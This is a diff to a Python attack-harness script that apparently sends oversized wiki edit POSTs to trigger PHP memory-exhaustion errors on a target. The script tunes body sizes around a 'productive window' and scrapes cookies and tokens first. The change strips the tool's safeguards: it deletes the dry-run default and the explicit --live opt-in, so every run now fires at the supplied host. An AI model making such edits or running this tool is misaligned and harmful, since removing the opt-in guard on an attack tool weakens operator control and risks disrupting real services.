@@ -9,12 +9,11 @@ puts 5.7M-6.0M at the "Allowed memory size ... in Unknown on line 0" post-app
 fatal and 9M past the post_max_size ceiling (pre-parser "POST Content-Length
 exceeds the limit" warning instead, no app fatal - the productive window).
 
-Offline-first: the module CLI and the driver (--step producer) are dry by
-default - they build the byte-exact request streams and record them WITHOUT
-sending. Live fire happens only through --live (or fire()) and is guarded by a
-hard pre-send POST_MAX_SIZE ceiling check. Dry shapes without a scraped
-cookie/token are the byte-exact fallback templates (cookie-less bootstrapless
-variant / token-scrape-fail variant) the live path would substitute into.
+The module CLI and the driver (--step producer) send the byte-exact request
+streams to the supplied target. fire() is guarded by a hard pre-send
+POST_MAX_SIZE ceiling check. dry() remains the offline builder: shapes without
+a scraped cookie/token are the byte-exact fallback templates (cookie-less
+bootstrapless variant / token-scrape-fail variant) the send substitutes into.
 """
 
 import argparse
@@ -162,7 +161,7 @@ def dry(host_header: str, text_bytes: int, output: Path) -> dict:
 
 def fire(host: str, port: int, text_bytes: int, output: Path,
          timeout: float = 45.0) -> dict:
-    """Live ladder (explicit --live only): bootstrap cookie -> token -> edit POST.
+    """Send the ladder to the supplied target: bootstrap cookie -> token -> edit POST.
 
     Byte framing is identical to dry(): the dry-built edit request and the sent
     edit request differ only in the substituted cookie/token values.
@@ -257,31 +256,18 @@ def fire(host: str, port: int, text_bytes: int, output: Path,
 
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="fpmwiki producer stage: build (default) without sending, "
-        "--live for the receipt ladder fire")
+        description="fpmwiki producer stage: send the receipt ladder to the "
+        "supplied target")
     parser.add_argument("--host", default="127.0.0.1")
     parser.add_argument("--port", type=int, default=28840)
-    parser.add_argument("--host-header", default=None,
-                        help="Host header value; default <host>:<port>")
     parser.add_argument("--body-bytes", type=int, default=DEFAULT_BODY_BYTES,
                         help="wpTextbox1 'A'*N; int N, receipt sweet spot 5.7M-6.0M")
-    dry_group = parser.add_mutually_exclusive_group()
-    dry_group.add_argument("--build-only", action="store_true",
-                           help="alias of the default dry build")
-    dry_group.add_argument("--live", action="store_true",
-                           help="actually send (bootstrap, token, edit POST)")
-    dry_group.add_argument("--dry-run", action="store_true",
-                           help="default behavior, accepted explicitly")
     parser.add_argument("--timeout", type=float, default=45.0)
     parser.add_argument("--output", required=True, type=Path)
     args = parser.parse_args()
 
-    host_header = args.host_header or f"{args.host}:{args.port}"
-    if args.live:
-        summary = fire(args.host, args.port, args.body_bytes, args.output,
-                       timeout=args.timeout)
-    else:
-        summary = dry(host_header, args.body_bytes, args.output)
+    summary = fire(args.host, args.port, args.body_bytes, args.output,
+                   timeout=args.timeout)
     (args.output / "result.json").write_text(
         json.dumps(summary, indent=2, sort_keys=True) + "\n")
     print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
